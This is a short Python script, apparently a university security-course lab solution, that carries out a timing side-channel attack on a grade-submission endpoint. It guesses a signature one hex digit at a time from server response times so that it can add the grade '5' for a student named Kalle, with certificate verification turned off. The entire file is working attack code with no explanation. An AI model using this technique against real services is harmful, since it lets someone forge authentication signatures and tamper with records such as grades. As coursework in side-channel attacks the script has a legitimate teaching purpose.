import requests;
import warnings;
import operator;
import urllib
import time


def findTime(address,signature,name,grade):
    hexArray = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"];
    winner = dict();

    for x in range(0, 10):
        temp = dict();
        for hex in hexArray:
            params = {'name': name, 'grade': grade, "signature": (signature + hex).encode("utf-8")};

            start = time.time();
            response = requests.get(address,params,verify=False);
            elapsedTime = time.time() - start;
            #print(hex + ": " + str(elapsedTime) + " | " + response.url);
            temp[hex] = elapsedTime;

        win = max(temp, key=temp.get);

        if(not winner.keys().__contains__(win)):
            winner[win] = 0;
            winner[win] += 1;
        else:
             winner[win] += 1;

    value = max(winner, key=winner.get);

    print(winner);
    print(value);
    return value;

with warnings.catch_warnings():
    warnings.simplefilter("ignore")
    name = "Kalle";
    grade = "5";
    signature = "6823";

    address = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php";

    for x in range (0,20):
        addressVal = findTime(address,signature,name,grade);
        signature = signature + addressVal;

    print(signature);